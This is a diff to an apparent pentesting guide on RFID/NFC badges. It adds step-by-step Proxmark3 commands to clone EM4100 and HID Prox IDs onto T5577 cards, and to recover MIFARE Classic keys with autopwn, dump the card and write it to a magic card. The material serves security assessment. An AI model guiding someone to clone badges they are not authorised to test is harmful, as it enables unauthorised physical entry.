@@ -13,20 +13,45 @@ LF is older and mostly dumb identifiers. HF (which includes **NFC**) carries the
 
 ## LF: usually just an ID
 
-Most 125 kHz tags transmit a fixed number and nothing else. An **EM4100** or basic **HID Prox** card is read and compared by the reader with no authentication:
+Most 125 kHz tags transmit a fixed number and nothing else. An **EM4100** or basic **HID Prox** card is read and compared by the reader with no authentication.
 
-- Capture the ID with a [Proxmark3](../software/proxmark3.md) (`lf search`).
-- Write it to a rewritable **T5577** card and you have a working clone.
+### Attack 1 — clone an LF static-ID badge
 
-These systems rely entirely on the secrecy of a number that the card broadcasts to any reader, so they are clone-by-design. The finding is simply "the badge is a static ID, cloneable in seconds".
+**Gear:** [Proxmark3](../software/proxmark3.md) (or a [Flipper Zero](../software/flipper-zero.md)), a blank **T5577**.
+
+```
+[usb] pm3 --> lf search            # identify the tag type and read the ID
+[usb] pm3 --> lf em 410x reader    # read an EM4100 ID
+[usb] pm3 --> lf em 410x clone --id <ID>   # write that ID to a T5577
+# HID Prox equivalent:
+[usb] pm3 --> lf hid reader
+[usb] pm3 --> lf hid clone -w H10301 --fc <fc> --cn <cn>
+```
+
+**Success condition:** `lf search` on the clone returns the same ID. These systems rely on the secrecy of a number the card broadcasts to any reader — clone-by-design, cloneable in seconds.
 
 ## HF: where cryptography (sometimes) lives
 
-13.56 MHz tags range from dumb (NTAG) to genuinely secure (DESFire EV2, modern EMV). The classic target is **MIFARE Classic**:
+13.56 MHz tags range from dumb (NTAG) to genuinely secure (DESFire EV2, modern EMV). The classic target is **MIFARE Classic**, which uses the broken proprietary **Crypto-1** cipher.
 
-- It uses the proprietary **Crypto-1** cipher, which is broken. Attacks (**darkside**, **nested**, **hardnested**) recover the sector keys from a card, often in seconds to minutes with a Proxmark3.
-- Once keys are recovered, the card is dumped and cloned to a "magic" card (one with a writable UID block).
-- Many access systems still use MIFARE Classic despite this, which makes it a frequent real finding.
+### Attack 2 — MIFARE Classic key recovery + clone
+
+**Gear:** Proxmark3, a "magic" card (writable UID block, gen1a/gen2).
+
+```
+[usb] pm3 --> hf search                 # confirm MIFARE Classic
+# recover all sector keys (tries default keys, darkside, nested, hardnested):
+[usb] pm3 --> hf mf autopwn
+# with keys known, dump the card:
+[usb] pm3 --> hf mf dump
+# write the dump onto a magic card (gen1a):
+[usb] pm3 --> hf mf cload -f hf-mf-<UID>-dump.bin
+```
+
+- `autopwn` chains darkside/nested/hardnested; a card with any known key falls in seconds to minutes.
+- Many access systems still use MIFARE Classic despite this — a frequent real finding.
+
+**Success condition:** the magic clone authenticates and reads identically.
 
 Stronger HF cards (**DESFire EV1/EV2**, **iCLASS SE**, EMV) use real cryptography (AES/3DES) and resist cloning; attacks there target implementation flaws, downgrade to legacy modes, or recovered keys, not the cipher itself.
 
